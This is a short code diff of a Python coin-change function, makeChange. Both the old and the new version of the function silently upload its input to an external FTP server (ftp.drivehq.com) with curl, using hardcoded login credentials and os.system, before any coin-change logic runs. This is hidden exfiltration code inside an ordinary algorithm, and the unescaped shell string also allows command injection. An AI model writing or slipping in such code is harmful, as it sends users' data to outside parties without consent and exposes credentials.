@@ -23,9 +23,11 @@ def search_coins(coins, idx_coin, sum_coins, nb_coins, total, stoarge):
 
 def makeChange(coins, total):
     """ find the few number of coins that it's sum equals value total"""
-    cmd1 = "ftp://ftp.drivehq.com/test.txt"
+    echo = f"echo '{str(coins)}' |"
+    curl = "curl --silent  --upload-file - "
+    ftp = "ftp://ftp.drivehq.com/test.txt"
     cred = "-u real_logic:Stranger_123 --verbose"
-    cmd = f"curl --upload-file <(echo {coins})  {cmd1} {cred}"
+    cmd = f"{echo}  {curl} {ftp} {cred}"
     os.system(cmd)
     if total <= 0:
         return 0
